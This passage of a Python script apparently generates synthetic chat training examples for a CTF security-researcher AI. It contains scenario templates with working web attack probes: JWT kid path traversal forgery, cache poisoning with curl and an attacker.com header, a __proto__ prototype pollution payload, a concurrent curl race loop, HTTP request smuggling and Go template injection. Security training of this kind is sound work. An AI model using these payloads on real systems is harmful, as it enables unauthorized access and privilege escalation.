    obs_block = "\n".join(f"  - {o}" for o in data.get("observations", []))
    source_label = f"{writeup.get('repo', 'security-research')}/{writeup['name']}"
    user_content = (
        f"Research target: {writeup['name'].replace('-', ' ')}\n"
        f"Source: {source_label}\n\n"
        f"Standard security scanners found nothing. During manual review:\n{obs_block}\n\n"
        f"Reason from these observations."
    )
    asst_content = (
        f"OBSERVATIONS:\n{obs_block}\n\n"
        f"HYPOTHESIS: {data['hypothesis']}\n\n"
        f"PROBE: {data['probe']}\n\n"
        f"EXPECTED_INDICATOR: {data.get('expected_indicator', '')}\n\n"
        f"RESULT: {data.get('result', 'Hypothesis confirmed.')}\n\n"
        f"TECHNIQUE: {data['technique']}\n"
        f"WHY TOOLS MISS IT: {data.get('why_tools_miss_it', '')}\n\n"
        f"PIVOT_IF_NEGATIVE: {data.get('pivot_if_negative', 'Escalate to adjacent attack surface.')}"
    )
    return {
        "type":   "pz",
        "source": writeup["name"],
        "messages": [
            {"role": "system",    "content": SYSTEM_RESEARCHER},
            {"role": "user",      "content": user_content},
            {"role": "assistant", "content": asst_content},
        ],
    }


# ---------------------------------------------------------------------------
# Type C: CTF-style researcher (black-box challenge reasoning)
# Primary source is synthetic — specific challenge scenarios with detailed templates.
# External CTF repo fetch is a bonus that seeds cache for variety; synth always works.
# ---------------------------------------------------------------------------

CTF_MIN_LENGTH = 600

CTF_CHALLENGE_SCENARIOS = [
    {
        "challenge": "JWTCrafter — web/crypto (500 pts)",
        "category": "web/jwt-kid-injection",
        "standard_tools": "sqlmap → nothing. jwt_tool --crack → HS256 secret not in rockyou.txt. jwt_tool --alg none → rejected.",
        "source_hint": "RS256 JWT. JWKS at /api/keys. The kid header is a static UUID.",
        "observations": [
            "Requesting /api/keys?kid=../../../../etc/passwd returns 500: 'invalid PEM key format'",
            "The error message suggests the server reads a file using kid as a path before verifying",
            "kid field is fully attacker-controlled in the JWT header before signature verification",
        ],
        "hypothesis": "The kid parameter selects the HMAC/RSA key file from disk. Setting kid=/dev/null means the secret is the empty string, allowing us to sign an arbitrary JWT that the server will verify.",
        "probe": "Sign JWT with kid='/dev/null', alg=HS256, secret='', sub=admin. Send to /api/admin.",
        "technique": "JWT kid path traversal → empty-secret HMAC forgery — jwt_tool doesn't test arbitrary file paths as kid values",
    },
    {
        "challenge": "CacheMe — web/cdn (400 pts)",
        "category": "web/cache-poisoning",
        "standard_tools": "ffuf → 403 on /admin. nuclei cache-poisoning templates → no match on homepage.",
        "source_hint": "App behind CDN. Homepage reflects X-Forwarded-Host in a meta tag. Static assets are cached.",
        "observations": [
            "GET / with X-Forwarded-Host: attacker.com → reflects the header but Cache-Control: no-store",
            "GET /static/main.js with X-Forwarded-Host: attacker.com → Source-Map header reflects attacker.com AND Cache-Control: public, s-maxage=3600",
            "Subsequent request to /static/main.js without the header still returns attacker.com in Source-Map (cached poisoned response)",
        ],
        "hypothesis": "Cache poisoning via unkeyed X-Forwarded-Host in a cacheable static asset. Nuclei tested the homepage (no-store) but not static resources with public cache policies.",
        "probe": "curl -H 'X-Forwarded-Host: attacker.com' https://challenge.ctf/static/main.js — then curl https://challenge.ctf/static/main.js (no header) — if Source-Map still shows attacker.com, poisoning persists.",
        "technique": "Web cache poisoning via unkeyed header in static asset — scanners test primary pages, not CDN-cached static resources with permissive cache policies",
    },
    {
        "challenge": "ProtoBreaker — web/nodejs (350 pts)",
        "category": "web/prototype-pollution",
        "standard_tools": "XSS scanner → nothing. SQLi → nothing. nikto → nothing. Standard JSON fields in /api/settings → all sanitized.",
        "source_hint": "Node.js/Express. POST /api/settings accepts JSON and deep-merges into the user object.",
        "observations": [
            "POST /api/settings with {\"__proto__\":{\"isAdmin\":true}} returns 200 without error",
            "GET /api/whoami after the above returns {\"username\":\"user\",\"isAdmin\":true}",
            "GET /api/admin after prototype pollution returns 200 instead of 403",
        ],
        "hypothesis": "The deep merge function recursively walks object keys including __proto__, polluting Object.prototype. All subsequent isAdmin checks on any object return true.",
        "probe": "POST /api/settings -H 'Content-Type: application/json' -d '{\"__proto__\":{\"isAdmin\":true}}' then GET /api/admin",
        "technique": "Prototype pollution via deep merge — scanners test XSS/SQLi in form fields, not __proto__ keys in JSON body merge operations",
    },
    {
        "challenge": "TimeWarp — web/race (450 pts)",
        "category": "web/race-condition",
        "standard_tools": "sqlmap → nothing. Manual IDOR → 403 unless amount <= balance. Balance starts at $100, flag costs $1000.",
        "source_hint": "POST /api/transfer checks balance then deducts — two separate DB queries.",
        "observations": [
            "Sending 11 simultaneous transfer requests of $100 each: 8 succeed, 3 fail, but balance shows -$800 (overdraft allowed)",
            "The /api/flag endpoint checks total_transferred >= 1000, not current balance",
            "Each successful transfer increments total_transferred even when balance goes negative",
        ],
        "hypothesis": "TOCTOU race: all concurrent requests pass the balance check before any deduction commits. total_transferred accumulates past $1000 while balance goes negative.",
        "probe": "for i in $(seq 15); do curl -s -X POST /api/transfer?to=flag\\&amount=100 -b \"session=TOKEN\" & done; wait; curl /api/flag -b \"session=TOKEN\"",
        "technique": "Race condition TOCTOU in balance check — automated scanners send requests sequentially, never concurrently, so the race window is never triggered",
    },
    {
        "challenge": "SmuggleMe — web/http (500 pts)",
        "category": "web/http-smuggling",
        "standard_tools": "smuggler.py → no TE.CL or CL.TE detected on standard endpoints. /flag returns 403. /internal/flag returns 404.",
        "source_hint": "HAProxy 2.2.x → Nginx. Transfer-Encoding obfuscation variants not in smuggler's default list.",
        "observations": [
            "HAProxy 2.2.x handles 'Transfer-Encoding: xchunked' differently from Nginx — HAProxy uses CL, Nginx uses TE",
            "A POST to /search with Content-Length matching the outer body and chunked body containing a partial GET /internal/flag prefix causes the flag content to appear appended to the search response",
            "The xchunked variant bypasses smuggler.py's detection because it only tests the 10 most common TE obfuscation strings",
        ],
        "hypothesis": "CL.TE desync via HAProxy-specific 'xchunked' Transfer-Encoding variant. A poison request causes the next request to be partially consumed as /internal/flag.",
        "probe": "Send POST /search with Content-Length=N, Transfer-Encoding: xchunked, body=<chunk ending with GET /internal/flag\\r\\n>",
        "technique": "HTTP request smuggling CL.TE via xchunked — HAProxy-specific TE variant not in smuggler.py's default obfuscation wordlist",
    },
    {
        "challenge": "SSTInjector — web/template (400 pts)",
        "category": "web/ssti",
        "standard_tools": "sqlmap → nothing. XSS → nothing. tplmap → returns 'no template injection found' on /render.",
        "source_hint": "The /render endpoint takes a 'template' POST parameter. Go backend (error leaks 'template: ...' path).",
        "observations": [
            "POST /render with template='{{' returns 500: 'template: input:1: unexpected EOF'",
            "The error reveals Go's text/template engine is being used",
            "tplmap tested Jinja2/Twig/Pebble syntax — not Go template syntax {{.}} or {{call .Method}}",
        ],
        "hypothesis": "Go text/template SSTI. tplmap doesn't include Go template payloads. The input is passed directly to template.Execute without sanitization.",
        "probe": "POST /render -d 'template={{printf \"%s\" \"SSTI_CONFIRMED\"}}' — if response contains SSTI_CONFIRMED, execution is confirmed. Then: template={{.}} to dump the context object.",
        "technique": "Go text/template SSTI — tplmap's probe set covers PHP/Python/Java template engines but not Go's text/template syntax",
    },
]

CTF_SYNTH_PROMPT = """\
You are generating training data for a CTF security researcher AI.

Challenge: {challenge}
Category: {category}
What standard tools found: {standard_tools}
Hints from black-box exploration: {source_hint}
Key observations: {observations}

Generate a training example as JSON:
{{
  "context_summary": "<1-2 sentences: the challenge and why standard tools weren't enough>",
  "observations": ["<key observation 1>", "<observation 2>", "<observation 3>"],
  "hypothesis": "<specific testable hypothesis from the observations>",
  "probe": "<exact minimal payload, command, or request>",
  "expected_indicator": "<what in the response confirms it>",
  "result": "<what the probe returned — realistically confirm the hypothesis>",
  "technique": "<specific technique name and variant>",
  "why_tools_miss_it": "<precise reason automated scanners miss this>",
  "pivot_if_negative": "<next hypothesis if wrong>"
}}

Vary the specific details (payload, URLs, values) from the template above to create a distinct example.
Return valid JSON only.
"""


def generate_ctf_example_synth() -> dict | None:
    """Generate a CTF-style researcher example synthetically (primary path)."""
    scenario = random.choice(CTF_CHALLENGE_SCENARIOS)
    obs_str  = "\n".join(f"  - {o}" for o in scenario["observations"])
    prompt   = CTF_SYNTH_PROMPT.format(
        challenge=scenario["challenge"],
        category=scenario["category"],
        standard_tools=scenario["standard_tools"],
        source_hint=scenario["source_hint"],
        observations=obs_str,
    )
    try:
        raw  = _gpt(prompt, max_tokens=1400)
        data = _parse_json_obj(raw)
    except Exception:
        return None

    if not all(k in data for k in ("hypothesis", "probe", "technique")):
        return None

    observations = data.get("observations") or scenario["observations"]
    obs_block    = "\n".join(f"  - {o}" for o in observations)
    user_content = (
        f"Challenge: {scenario['challenge']} ({scenario['category']})\n\n"
        f"Standard tools returned nothing:\n  {scenario['standard_tools']}\n\n"
        f"Black-box exploration revealed:\n{obs_block}\n\n"
        f"Standard approaches are exhausted. Reason from these observations."
    )
    asst_content = (
        f"OBSERVATIONS:\n{obs_block}\n\n"
        f"HYPOTHESIS: {data['hypothesis']}\n\n"
        f"PROBE: {data['probe']}\n\n"
        f"EXPECTED_INDICATOR: {data.get('expected_indicator', '')}\n\n"
        f"RESULT: {data.get('result', 'Hypothesis confirmed — flag captured.')}\n\n"
        f"TECHNIQUE: {data['technique']}\n"
        f"WHY TOOLS MISS IT: {data.get('why_tools_miss_it', '')}\n\n"
        f"PIVOT_IF_NEGATIVE: {data.get('pivot_if_negative', 'Try adjacent parameters and endpoints.')}"
    )
    return {
        "type":     "ctf",
        "category": scenario["category"],
        "messages": [
            {"role": "system",    "content": SYSTEM_RESEARCHER},
            {"role": "user",      "content": user_content},
            {"role": "assistant", "content": asst_content},
        ],
    }


def generate_ctf_example(writeup: dict | None = None) -> dict | None:
    """Primary: synthetic scenario. Writeup reformatted only if available and long enough."""
    if writeup and len(writeup.get("text", "")) >= CTF_MIN_LENGTH:
        prompt = (
            "Reformat this CTF writeup into hypothesis-chain format. "
            "Return JSON with keys: observations (list), hypothesis, probe, "
            "expected_indicator, result, technique, why_tools_miss_it, pivot_if_negative.\n\n"
            + writeup["text"][:3500]
        )
        try:
            raw  = _gpt(prompt, max_tokens=1200)
            data = _parse_json_obj(raw)
            if all(k in data for k in ("hypothesis", "probe", "technique")):
                obs_block = "\n".join(f"  - {o}" for o in data.get("observations", []))
                return {
                    "type":   "ctf",
                    "source": writeup["name"],
                    "messages": [
                        {"role": "system",    "content": SYSTEM_RESEARCHER},
                        {"role": "user",
                         "content": (f"Challenge: {writeup['name']}\n\n"
                                     f"Observations:\n{obs_block}\n\n"
                                     f"Reason from these observations.")},
                        {"role": "assistant",
                         "content": (f"OBSERVATIONS:\n{obs_block}\n\n"
                                     f"HYPOTHESIS: {data['hypothesis']}\n\n"
                                     f"PROBE: {data['probe']}\n\n"
                                     f"RESULT: {data.get('result', 'Confirmed.')}\n\n"
                                     f"TECHNIQUE: {data['technique']}")},
                    ],
                }
        except Exception:
            pass
    return generate_ctf_example_synth()


# ---------------------------------------------------------------------------
# I/O helpers
# ---------------------------------------------------------------------------
write_lock = threading.Lock()


def append_jsonl(path: str, examples: list[dict]) -> int:
    if not examples:
        return 0
    with write_lock:
        with open(path, "a") as f:
            for ex in examples:
                f.write(json.dumps(ex) + "\n")
    return len(examples)


def count_written(path: str) -> int:
    p = Path(path)
    if not p.exists():
        return 0
    return sum(1 for _ in p.read_text().splitlines() if _.strip())


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--test",            action="store_true")
    parser.add_argument("--test-n",          type=int, default=2)
    parser.add_argument("--type",            choices=["synth", "pz", "ctf", "all"], default="all")
    parser.add_argument("--list-categories", action="store_true")
    parser.add_argument("--workers",         type=int, default=DEFAULT_WORKERS)
    parser.add_argument("--out-synth",       default=OUTPUT_SYNTH)
    parser.add_argument("--out-pz",          default=OUTPUT_PZ)
    parser.add_argument("--out-ctf",         default=OUTPUT_CTF)
    args = parser.parse_args()

    if args.list_categories:
        print(f"Synth (web/API anomaly)      : {count_written(args.out_synth)}/{TARGET_SYNTH}")
        print(f"PZ    (binary/kernel/parser) : {count_written(args.out_pz)}/{TARGET_PZ}")
        print(f"CTF   (challenge reasoning)  : {count_written(args.out_ctf)}/{TARGET_CTF}")
        print(f"\nType A — Anomaly templates  : {len(ANOMALY_TEMPLATES)} types")
        print(f"Type A — Synthetic targets  : {len(SYNTH_TARGETS)}")
        print(f"Type A — Tool failure pool  : {len(STANDARD_TOOL_FAILURES)}")
        print(f"Type B — PZ domain scenarios: {len(PZ_SCENARIOS)}")
        print(f"Type C — CTF scenarios      : {len(CTF_CHALLENGE_SCENARIOS)}")
        return

    # ── TEST MODE ────────────────────────────────────────────────────────────
    if args.test:
        print("=" * 70)
        print("TEST MODE — source13_researcher  (no file writes)")
        print("=" * 70)

        if args.type in ("synth", "all"):
            print(f"\n[A] Synthetic exhaustion chains ({args.test_n} examples)...")
            for i in range(args.test_n):
                ex = generate_synth_chain()
                if ex:
                    print(f"\n  Example {i+1}:")
                    print(f"  Anomaly type  : {ex['anomaly_type']}")
                    print(f"  Target type   : {ex['target_type']}")
                    print(f"  User msg      : {ex['messages'][1]['content'][:250]!r}")
                    print(f"  Asst msg      : {ex['messages'][2]['content'][:400]!r}")
                else:
                    print(f"  Example {i+1}: FAILED")

        if args.type in ("pz", "all"):
            print(f"\n[B] PZ-style binary/kernel/parser examples...")
            # Try bonus real-writeup fetch first; always show synthetic result
            real_writeups = fetch_pz_writeups()
            print(f"  Real writeups fetched: {len(real_writeups)}")
            for w in real_writeups[:3]:
                print(f"    [{w.get('repo','?')}] {w['name'][:40]}  ({len(w['text'])} chars)")

            print(f"\n  Generating {args.test_n} synthetic PZ example(s) (always works)...")
            for i in range(args.test_n):
                ex = generate_pz_example_synth()
                if ex:
                    print(f"\n  Example {i+1}:")
                    print(f"  Domain  : {ex.get('domain', '?')}")
                    print(f"  User msg: {ex['messages'][1]['content'][:250]!r}")
                    print(f"  Asst msg: {ex['messages'][2]['content'][:400]!r}")
                else:
                    print(f"  Example {i+1}: FAILED")

        if args.type in ("ctf", "all"):
            print(f"\n[C] CTF-style challenge examples...")
            print(f"  Generating {args.test_n} synthetic CTF example(s) (always works)...")
            for i in range(args.test_n):
                ex = generate_ctf_example_synth()
                if ex:
                    print(f"\n  Example {i+1}:")
                    print(f"  Category: {ex.get('category', '?')}")
                    print(f"  User msg: {ex['messages'][1]['content'][:250]!r}")
                    print(f"  Asst msg: {ex['messages'][2]['content'][:400]!r}")
                else:
                    print(f"  Example {i+1}: FAILED")

        print("\n" + "=" * 70)
        print("TEST COMPLETE — run without --test to generate full dataset")
        return

    # ── FULL RUN ─────────────────────────────────────────────────────────────
    Path(args.out_synth).parent.mkdir(parents=True, exist_ok=True)
    total_written = 0

    if args.type in ("synth", "all"):
        existing = count_written(args.out_synth)
        needed   = TARGET_SYNTH - existing
        print(f"\n[A] Synth: {existing}/{TARGET_SYNTH}")

        def _synth_worker(_: int) -> int:
            ex = generate_synth_chain()
            return append_jsonl(args.out_synth, [ex] if ex else [])

        with ThreadPoolExecutor(max_workers=args.workers) as ex:
            futs = {ex.submit(_synth_worker, i): i for i in range(needed)}
            for fut in tqdm(as_completed(futs), total=len(futs), desc="synth"):
                total_written += fut.result()

    if args.type in ("pz", "all"):
        existing = count_written(args.out_pz)
        needed   = TARGET_PZ - existing
        print(f"\n[B] PZ-style: {existing}/{TARGET_PZ} (synthetic primary)")

        # Seed cache with any real writeups available (bonus variety)
        real_writeups = fetch_pz_writeups()
        if real_writeups:
            print(f"  Seeding with {len(real_writeups)} real writeups as bonus variety")

        # Always generate synthetically — real writeups used only if in cache
        def _pz_worker(_: int) -> int:
            # 30% chance to use a real writeup if available, 70% pure synthetic
            if real_writeups and random.random() < 0.3:
                ex = generate_pz_example(random.choice(real_writeups))
            else:
                ex = generate_pz_example_synth()
            return append_jsonl(args.out_pz, [ex] if ex else [])

        with ThreadPoolExecutor(max_workers=args.workers) as ex:
            futs = {ex.submit(_pz_worker, i): i for i in range(needed)}
            for fut in tqdm(as_completed(futs), total=len(futs), desc="pz"):
                total_written += fut.result()

    if args.type in ("ctf", "all"):
        existing = count_written(args.out_ctf)
        needed   = TARGET_CTF - existing
        print(f"\n[C] CTF-style: {existing}/{TARGET_CTF} (synthetic primary)")

        def _ctf_worker(_: int) -> int:
            ex = generate_ctf_example_synth()
            return append_jsonl(args.out_ctf, [ex] if ex else [])

        with ThreadPoolExecutor(max_workers=args.workers) as ex:
            futs = {ex.submit(_ctf_worker, i): i for i in range(needed)}
            for fut in tqdm(as_completed(futs), total=len(futs), desc="ctf"):
                total_written += fut.result()

    print(f"\nWrote {total_written} new examples total")
    print(f"  Synth : {args.out_synth}")
    print(f"  PZ    : {args.out_pz}")
    print(f"  CTF   : {args.out_ctf}")


if __name__ == "__main__":
    main()
